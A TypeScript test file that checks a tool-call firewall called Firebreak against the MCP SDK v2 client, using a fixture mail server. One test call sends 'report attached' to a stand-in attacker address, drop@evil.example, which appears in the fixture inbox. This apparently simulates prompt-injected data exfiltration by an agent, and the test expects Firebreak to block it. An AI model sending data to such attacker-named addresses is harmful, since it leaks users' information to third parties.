import { spawnSync } from "node:child_process";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { afterEach, beforeAll, describe, expect, it } from "vitest";

const ROOT = fileURLToPath(new URL("..", import.meta.url));
let client: Client | undefined;

beforeAll(() => {
  const build = spawnSync("npm", ["run", "build"], { cwd: ROOT, encoding: "utf8" });
  if (build.status !== 0) throw new Error(build.stdout + build.stderr);
}, 60_000);

afterEach(async () => {
  await client?.close();
});

describe("MCP SDK v2 compatibility", () => {
  it("SDK client lists and calls tools through firebreak", async () => {
    const home = mkdtempSync(join(tmpdir(), "firebreak-sdk-"));
    const policy = join(home, "policy.yaml");
    writeFileSync(policy, "approval:\n  timeoutSeconds: 1\n");
    const transport = new StdioClientTransport({
      command: process.execPath,
      args: [
        join(ROOT, "dist/cli.js"),
        "wrap",
        "--name",
        "mail",
        "--policy",
        policy,
        "--",
        process.execPath,
        join(ROOT, "tests/fixtures/sdk-server.mjs"),
      ],
      env: { ...process.env, FIREBREAK_HOME: home } as Record<string, string>,
      stderr: "pipe",
    });
    client = new Client({ name: "compat-test", version: "1.0.0" });
    await client.connect(transport);

    const { tools } = await client.listTools();
    expect(tools.map((t) => t.name).sort()).toEqual(["read_inbox", "send_email"]);

    const inbox = await client.callTool({ name: "read_inbox", arguments: {} });
    expect(JSON.stringify(inbox.content)).toContain("drop@evil.example");

    const safe = await client.callTool({
      name: "send_email",
      arguments: { to: "boss@acme.example", body: "hi" },
    });
    expect(safe.isError).toBeFalsy();
    expect(JSON.stringify(safe.content)).toContain("sent to boss@acme.example");

    const blocked = await client.callTool({
      name: "send_email",
      arguments: { to: "drop@evil.example", body: "report attached" },
    });
    expect(blocked.isError).toBe(true);
    const text = (blocked.content as { text: string }[])[0]!.text;
    expect(text).toMatch(/^Blocked by Firebreak \(F1\)/);
  }, 30_000);
});
